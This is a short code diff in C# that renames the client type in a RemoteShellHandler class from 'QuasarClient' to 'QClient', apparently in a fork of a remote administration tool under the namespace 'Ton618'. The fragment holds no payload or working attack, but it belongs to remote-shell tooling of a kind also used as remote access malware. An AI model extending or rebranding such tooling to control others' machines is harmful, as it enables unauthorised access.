@@ -20,13 +20,13 @@ namespace Ton618.MessageHandlers
         /// <summary>
         /// The client which is associated with this remote shell handler.
         /// </summary>
-        private readonly QuasarClient _client;
+        private readonly QClient _client;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteShellHandler"/> class using the given client.
         /// </summary>
         /// <param name="client">The associated client.</param>
-        public RemoteShellHandler(QuasarClient client)
+        public RemoteShellHandler(QClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
